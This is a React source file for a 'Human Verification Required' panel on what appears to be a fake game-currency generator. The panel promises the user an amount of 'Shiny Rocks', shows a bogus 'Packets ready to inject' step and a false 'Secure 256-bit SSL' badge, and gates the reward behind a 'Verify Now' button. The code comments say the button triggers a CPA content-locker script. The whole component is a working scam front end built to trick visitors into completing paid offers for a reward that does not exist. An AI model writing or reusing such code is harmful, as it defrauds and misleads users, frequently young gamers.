import React from 'react';
import { motion } from 'framer-motion';
import { ShieldAlert, CheckCircle, Fingerprint } from 'lucide-react';
import { UserData } from '../types';

interface VerificationProps {
  userData: UserData;
}

const Verification: React.FC<VerificationProps> = ({ userData }) => {
  
  const handleVerifyClick = () => {
    // Call the CPA locker function
    try {
      if ((window as any)._Vm) {
        (window as any)._Vm();
      } else {
        console.error("Verification script not loaded");
        alert("Verification tool is loading... please try again in a few seconds.");
      }
    } catch (e) {
      console.error(e);
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0, scale: 0.9 }}
      animate={{ opacity: 1, scale: 1 }}
      className="w-full max-w-md mx-auto"
    >
      <div className="bg-[#1e1e1e] border-2 border-yellow-500/50 rounded-3xl p-1 shadow-[0_0_30px_rgba(234,179,8,0.2)] overflow-hidden">
        <div className="bg-yellow-500/10 p-6 flex flex-col items-center text-center border-b border-gray-700">
           <div className="relative">
             <div className="absolute inset-0 bg-yellow-500 blur-xl opacity-20 animate-pulse"></div>
             <ShieldAlert className="w-16 h-16 text-yellow-500 relative z-10 mb-4" />
           </div>
           <h3 className="text-2xl font-bold text-white mb-2">Human Verification Required</h3>
           <p className="text-gray-400 text-sm leading-relaxed">
             We have prepared <strong className="text-white">{userData.amount.toLocaleString()} Shiny Rocks</strong> for user <strong className="text-white">{userData.username}</strong>. 
             <br /><br />
             Due to high bot activity on our servers, please complete one quick verification step to prove you are human.
           </p>
        </div>

        <div className="p-6 bg-[#181818]">
            {/* Steps */}
            <div className="space-y-4 mb-8">
                <div className="flex items-center gap-4 bg-[#252525] p-3 rounded-xl">
                    <div className="bg-green-500/20 p-2 rounded-full text-green-400">
                        <CheckCircle size={20} />
                    </div>
                    <div className="text-left">
                        <div className="text-sm font-bold text-gray-200">Values Generated</div>
                        <div className="text-xs text-gray-500">Packets ready to inject</div>
                    </div>
                </div>
                <div className="flex items-center gap-4 bg-[#252525] p-3 rounded-xl border border-yellow-500/30">
                    <div className="bg-yellow-500/20 p-2 rounded-full text-yellow-400 animate-pulse">
                        <Fingerprint size={20} />
                    </div>
                    <div className="text-left">
                        <div className="text-sm font-bold text-gray-200">Pending Verification</div>
                        <div className="text-xs text-gray-500">Waiting for user action...</div>
                    </div>
                </div>
            </div>

            {/* The Locker Button */}
            <button
              onClick={handleVerifyClick}
              className="w-full bg-gradient-to-r from-yellow-500 to-orange-600 hover:from-yellow-400 hover:to-orange-500 text-white font-bold py-4 rounded-2xl shadow-lg transform transition-all active:scale-95 flex items-center justify-center gap-2 group"
            >
              <span className="text-xl uppercase tracking-widest">Verify Now</span>
              <ShieldAlert className="w-5 h-5 group-hover:rotate-12 transition-transform" />
            </button>
            
            <p className="text-center text-gray-600 text-[10px] mt-4 uppercase tracking-widest">
              Secure 256-bit SSL Connection
            </p>
        </div>
      </div>
    </motion.div>
  );
};

export default Verification;